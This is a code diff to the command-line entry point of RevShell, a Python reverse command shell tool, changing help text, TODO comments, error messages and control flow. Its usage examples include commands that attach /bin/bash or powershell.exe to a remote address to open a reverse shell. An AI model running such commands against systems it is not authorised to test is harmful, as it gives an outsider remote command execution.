@@ -11,11 +11,13 @@ from multi.nodes.server import Server
 from multi.nodes.client import Client
 
 # TODO: add netcat compatibility mode
+# TODO: add no-color option
+# TODO: add functionality to allow users to specify address or url
 
 
 def print_help(arg_parser: ArgumentParser) -> None:
     """Print the program help menu to the console, then exit"""
-    print("\nRevShell (https://github.com/vandavey/RevShell)")
+    print("RevShell (https://github.com/vandavey/RevShell)")
     arg_parser.print_help()
     print()
     exit(0)
@@ -28,8 +30,9 @@ def missing_arg(arg_parser) -> None:
     print(*[
         "error:",
         "one or more of the following arguments are required:",
-        "TARGET, -l/--listen\n"
+        "TARGET, -l/--listen",
     ])
+    print(*[" " * 6, "(to view the help menu, use the -h/--help argument)\n"])
     exit(1)
 
 
@@ -42,7 +45,7 @@ parser = ArgumentParser(
     description="python 3 TCP reverse command shell application",
     epilog=dedent("""
         usage examples:
-          revshell -lp 55236
+          revshell --listen -p 55236
           revshell -vlp 8152 0.0.0.0
           revshell -vp 5555 -e powershell.exe 127.0.0.1
           revshell -p 5555 -e /bin/bash 192.168.1.1
@@ -81,7 +84,7 @@ parser.add_argument(
 
 parser.add_argument(
     "-q", "--quiet", action="store_true",
-    help="reduce console output as much as possible",
+    help="suppress console output as much as possible",
     default=False
 )
 
@@ -110,8 +113,7 @@ debug: bool = args.debug
 if __name__ == "__main__":
     if args.help:
         print_help(parser)
-
-    if (target is None) & (not listen):
+    elif (target is None) & (not listen):
         missing_arg(parser)
 
     utils.init_colorama()
